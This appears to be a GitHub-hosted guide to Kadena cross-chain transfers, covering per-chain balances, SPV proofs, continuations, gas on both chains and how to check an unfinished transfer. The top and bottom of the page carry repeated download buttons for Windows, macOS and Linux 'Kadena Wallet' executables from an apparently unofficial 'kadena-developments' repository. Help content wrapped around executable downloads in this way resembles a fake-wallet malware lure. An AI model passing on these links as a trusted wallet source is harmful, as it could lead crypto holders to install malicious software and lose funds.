![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Cross-Chain Transfers in Kadena Wallet: How the Twenty Chains Actually Connect</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Kadena is not one blockchain with twenty shards bolted on. It is twenty chains that each keep their own state, which means an account can hold KDA on chain 0 and nothing on chain 1, and moving value between them is a two-part operation rather than a single send. Most confusion about "missing" or "stuck" KDA comes from that one design decision.

This is what the transfer actually does, in the order it does it, and what to check when it looks unfinished.

## You'll see this if

- Your KDA balance shows on one chain but not another.
- A transfer left your source chain but never arrived at the destination.
- You are about to move funds and want to know why you are asked to confirm twice.
- You are choosing which chain to keep a balance on.

## Why Kadena has twenty chains

Chainweb runs twenty braided proof-of-work chains, numbered 0 to 19. Each produces its own blocks, averaging about 30 seconds, and each maintains its own state, including account balances.

Braiding means the chains cross-reference each other's blocks, so the security of the network as a whole is greater than any single chain's hashrate. The cost of that design is that state is not shared: your account exists per chain, and a balance on chain 4 is not visible to chain 9 unless something moves it there.

Two consequences follow, and both catch people out:

1. **An address alone does not tell you where your funds are.** The same `k:` address can exist on all twenty chains. Holding KDA on one of them is normal.
2. **A plain transfer cannot cross chains.** Sending to an account that does not exist on the destination chain fails, which is why receiving accounts usually need to exist before they are credited.

## What a cross-chain transfer really is

The coin contract implements it as a source-side debit that yields transfer details, followed by a destination-side continuation that presents a proof. In user terms:

1. **You start the transfer on the source chain.** You choose the destination chain and the receiving account.
2. **The source chain debits your account and yields the transfer details.** At this point your balance on the source chain has already gone down.
3. **The network includes that transaction in a block.** Until it is included, there is nothing to prove.
4. **An SPV proof is produced.** Simple Payment Verification proves to another chain that the source transaction really happened, without that chain replaying the source chain's history.
5. **The continuation is submitted to the destination chain with the proof.** The destination verifies it and credits the receiving account, creating it if needed with its guard.

That is the whole mechanism. It is not a bridge in the sense of a third-party custodian holding your coins; there is no separate pool and no wrapped token at the protocol level. It is one chain proving to another chain that a debit occurred.

## Why the two-part structure matters

Steps 2 and 5 are separate transactions. Nothing in the protocol guarantees that whoever starts a transfer also finishes it.

Well-built wallets automate the second half: they watch for inclusion, fetch the proof, and submit the continuation without asking you to think about it. Tools that do not automate it leave you in the most confusing state in crypto - a debited source balance and an empty destination - which looks exactly like a lost transfer.

If your wallet asks you to confirm twice, that is not a bug. It is the protocol showing through the interface.

## What "about 30 seconds" does not mean

Block time is about 30 seconds **per chain, on average**. It is not a transfer time. A cross-chain transfer needs the source transaction included, the proof produced, and then the continuation included on the destination chain, and the destination chain has its own block cadence.

Practical expectation: minutes, not seconds, and sometimes longer at busy periods. Any page that promises "instant" cross-chain transfers is describing an optimisation, not the base protocol.

## How to check a transfer that has not landed

Do this in order, and do not re-send while checking.

1. **Find the request key.** Every transfer produces one. Copy it before you close the confirmation screen if you can.
2. **Look up the source transaction.** Open a community explorer, select the source chain, and search the request key. If it is not there, the transaction was never submitted and the problem is local.
3. **If it is there and confirmed, note the block height.** That is your evidence that step 2 of the mechanism completed.
4. **Look up the destination chain.** Switch the explorer to the destination chain and search the same request key. A continuation transaction will carry it.
5. **If the continuation is missing, the transfer is unfinished, not lost.** Return to the wallet and look for a resume, complete, or pending-transfers view. Most wallets keep the proof needed to finish.
6. **Only if the wallet offers no way to finish it,** and you have the proof, a CLI or scripting route can submit the continuation. This is why keeping the full transaction details matters.

What you should not do is send a second transfer to "replace" the first. That is how people end up with two debits and one arriving balance.

## Gas on both chains

A cross-chain transfer costs gas on the source chain and gas on the destination chain. If the destination chain has nothing to pay with, the continuation can fail even though the source side succeeded.

That is worth planning for: if you are moving the last of your KDA off a chain, make sure the destination side can pay for its own step, or use a wallet that handles the fee path for you and says so explicitly.

## Choosing where to keep a balance

A few practical rules that follow directly from the architecture:

- **Keep the bulk where you use it.** If your activity is on chain 0, holding on chain 12 means a cross-chain transfer every time.
- **Check chain support before depositing.** Exchanges and services sometimes support only one chain for a given asset. A correct-looking address on the wrong chain is still the wrong destination.
- **Do one small transfer first** when moving to a new account, especially one that has never received on that chain.
- **Keep the request key** for anything large until you have seen it arrive.

## The verification habit

Because state is per chain, "my balance is wrong" usually means "I am looking at a different chain". Before assuming anything is lost, check the same address across chains 0 to 19 in an explorer. Balances spread across several chains are a normal state of affairs on Chainweb, not a symptom of a broken wallet.

## FAQ

**Is a cross-chain transfer a bridge?**
No. There is no custodian and no wrapped asset at protocol level. One chain proves a debit occurred and the other chain credits it.

**Why did my balance drop before the destination credited?**
Because the source debit happens first, by design. The destination credit is a separate transaction that must still be submitted.

**Can I cancel a cross-chain transfer?**
Not once the source transaction is confirmed. You can only complete it or wait; there is no protocol-level cancel.

**Does my account need to exist on the destination chain?**
The receiving account is created with its guard if it does not exist, provided the transfer supplies that guard. This is different from a same-chain transfer, where a missing account fails.

**Why do I need to pay twice?**
Two chains, two transactions, two fees. That is the direct cost of not sharing state.

**Which chains should I use?**
Whichever your services support. There is no "main" chain; all twenty are peers, and chain 0 is simply the most commonly referenced.

## Related reading

- Is Kadena dead? What ended and what still runs
- Community Edition of Kadena, explained
- What happened to Kadena: the timeline
- KDA delisting and withdrawal deadlines

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Stuck Cross-Chain Transfer in Kadena Wallet: Finish It, Don't Resend](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-wallet-stuck-cross-chain-transfer.md)
- [Sending KDA from Kadena Wallet: Four Checks Before You Press Send](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/how-to-send-kda-from-kadena-wallet.md)
- [Why Your KDA Balance Shows Zero, and Where It Really Is](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/why-kadena-balance-shows-zero-in-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
